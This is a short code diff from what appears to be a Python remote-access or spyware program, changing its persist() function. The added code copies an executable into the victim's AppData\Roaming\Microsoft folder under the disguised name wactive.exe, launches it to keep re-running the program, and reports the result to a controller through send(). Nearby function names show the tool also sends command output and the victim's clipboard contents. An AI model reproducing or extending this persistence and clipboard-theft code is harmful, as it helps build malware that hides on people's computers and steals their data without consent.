@@ -106,15 +106,12 @@ def cmd():
 # Program which will rerun this program
 def persist():
     path = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\wactive.exe"
-    if os.path.exists(path):
-        return
-
-    with open(r"F:\Python_Projects\test.exe", "rb")as f:
-        with open(path, "wb")as file:
-            file.write(f.read())
-
+    if not os.path.exists(path):
+        with open(r"F:\C PROJECTS\Persister\persister.exe", "rb")as f:
+            with open(path, "wb")as file:
+                file.write(f.read())
     Popen([path, sys.argv[0], os.path.realpath(sys.argv[0])])
-
+    send(f"Persister started at path {path}")
 
 # Sends clipboard
 def clipboard():
